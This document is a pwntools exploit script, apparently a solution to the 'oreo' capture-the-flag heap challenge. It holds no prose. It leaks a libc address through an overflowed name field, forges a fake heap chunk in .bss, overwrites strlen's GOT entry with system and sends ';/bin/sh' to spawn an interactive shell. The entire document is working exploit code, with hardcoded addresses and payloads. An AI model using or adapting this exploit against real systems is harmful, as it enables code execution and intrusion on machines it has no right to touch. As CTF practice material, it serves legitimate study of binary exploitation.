from pwn import *

DEBUG=1
if DEBUG:
	context.log_level='debug'
	p=process('./oreo')
	gdb.attach(p,'b *0x80487b5')
else:
	p=remote()

def add(name, description):
	p.sendline('1')	
	p.sendline(name)
	p.sendline(description)


def show():
	p.sendline('2')

def delete():
	p.sendline('3')


def message(notice):
	p.sendline('4')
	p.sendline(notice)

p.readuntil('Exit')
add('a','a')
delete()



#leak free_addr in libc
free_got=0x804a238
payload=27*'A' + p32(free_got)
add(payload, 25*'b')
show()

p.recvuntil('Description: ')
p.recvuntil('Description: ')

free_in_libc=u32(p.recv(4))
success(hex(free_in_libc))

#create fake chunk
for i in range(0x40-2):
	add('a','a')

bss_addr=0x804a2a8
#chunk1
payload='a'*27+p32(bss_addr) 
add(payload,'n')
#chunk2
message('a'*0x1c + '\x00'*4 + 'a'*4 + p32(100))
delete()

#when the func of message write notice to bss_addr, it will write to the addr of what 0x804a2a8 point to 
strlen_got=0x804a250
add('b', p32(strlen_got))

libc=ELF('libc-2.23.so')
libc_base = free_in_libc-libc.symbols['free']
system_addr = libc_base + libc.symbols['system']

success(hex(system_addr))


message(p32(system_addr)+';/bin/sh')
p.interactive()

